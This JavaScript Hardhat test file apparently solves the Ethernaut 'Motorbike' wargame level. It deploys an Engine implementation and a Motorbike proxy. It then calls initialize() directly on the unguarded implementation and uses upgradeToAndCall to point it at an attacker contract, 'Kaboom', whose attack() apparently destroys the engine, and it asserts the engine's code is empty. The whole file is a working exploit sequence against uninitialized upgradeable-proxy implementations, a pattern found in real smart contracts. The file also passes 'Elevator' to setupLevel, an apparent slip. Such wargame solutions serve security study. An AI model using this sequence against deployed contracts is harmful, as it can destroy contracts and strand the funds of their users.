const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Motorbike", async function () {
  let attacker;
  let factory;
  let instance;

  const CONTRACT_NAME = "Motorbike";
  const ATTACKER_NAME = "Kaboom";

  before(async function () {
    [_owner, attacker] = await ethers.getSigners();

    level = await setupLevel("Elevator", attacker.address);
    factory = level.factory;
    instance = level.instance;

    const engineFactory = await ethers.getContractFactory("Engine");
    engine = await engineFactory.deploy();
    await engine.deployed();

    const Motorbike = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await Motorbike.deploy(engine.address);
    await contract.deployed();

    contract = contract.connect(attacker);
    engine = engine.connect(attacker);
  });

  it("Exploit", async function () {
    const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
    attackerContract = await attackerFactory.connect(attacker).deploy();
    await attackerContract.deployed();

    tx = await engine.initialize();
    await tx.wait();

    const iface = new ethers.utils.Interface(["function attack()"]);
    const data = iface.encodeFunctionData("attack");

    tx = await engine.upgradeToAndCall(attackerContract.address, data);
    await tx.wait();

    const code = await ethers.provider.getCode(engine.address);
    expect(code).to.eq("0x");
  });

});